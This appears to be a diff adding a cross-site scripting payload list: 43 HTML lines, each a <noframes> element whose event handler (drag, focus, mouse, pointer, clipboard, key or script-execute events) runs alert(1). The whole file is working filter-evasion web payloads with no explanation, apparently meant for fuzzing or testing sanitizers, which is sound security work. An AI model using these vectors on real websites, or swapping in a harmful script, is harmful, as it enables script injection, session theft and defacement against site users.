@@ -1,0 +1,43 @@
+<noframes draggable="true" ondrag="alert(1)">test</noframes>
+<noframes draggable="true" ondragend="alert(1)">test</noframes>
+<noframes draggable="true" ondragenter="alert(1)">test</noframes>
+<noframes draggable="true" ondragleave="alert(1)">test</noframes>
+<noframes draggable="true" ondragstart="alert(1)">test</noframes>
+<noframes id=x tabindex=1 onactivate=alert(1)></noframes>
+<noframes id=x tabindex=1 onbeforeactivate=alert(1)></noframes>
+<noframes id=x tabindex=1 onbeforedeactivate=alert(1)></noframes><input autofocus>
+<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>
+<noframes id=x tabindex=1 onfocus=alert(1)></noframes>
+<noframes id=x tabindex=1 onfocusin=alert(1)></noframes>
+<noframes onafterscriptexecute=alert(1)><script>1</script>
+<noframes onbeforecopy="alert(1)" contenteditable>test</noframes>
+<noframes onbeforecut="alert(1)" contenteditable>test</noframes>
+<noframes onbeforepaste="alert(1)" contenteditable>test</noframes>
+<noframes onbeforescriptexecute=alert(1)><script>1</script>
+<noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>
+<noframes onclick="alert(1)">test</noframes>
+<noframes oncontextmenu="alert(1)">test</noframes>
+<noframes oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<noframes oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<noframes ondblclick="alert(1)" autofocus tabindex=1>test</noframes>
+<noframes onfocusout=alert(1) tabindex=1 id=x></noframes><input autofocus>
+<noframes onkeydown="alert(1)" contenteditable>test</noframes>
+<noframes onkeypress="alert(1)" contenteditable>test</noframes>
+<noframes onkeyup="alert(1)" contenteditable>test</noframes>
+<noframes onmousedown="alert(1)">test</noframes>
+<noframes onmouseenter="alert(1)">test</noframes>
+<noframes onmouseleave="alert(1)">test</noframes>
+<noframes onmousemove="alert(1)">test</noframes>
+<noframes onmouseout="alert(1)">test</noframes>
+<noframes onmouseover="alert(1)">test</noframes>
+<noframes onmouseup="alert(1)">test</noframes>
+<noframes onmousewheel=alert(1)>requires scrolling
+<noframes onpaste="alert(1)" contenteditable>test</noframes>
+<noframes onpointerdown=alert(1)>XSS</noframes>
+<noframes onpointerenter=alert(1)>XSS</noframes>
+<noframes onpointerleave=alert(1)>XSS</noframes>
+<noframes onpointermove=alert(1)>XSS</noframes>
+<noframes onpointerout=alert(1)>XSS</noframes>
+<noframes onpointerover=alert(1)>XSS</noframes>
+<noframes onpointerrawupdate=alert(1)>XSS</noframes>
+<noframes onpointerup=alert(1)>XSS</noframes>
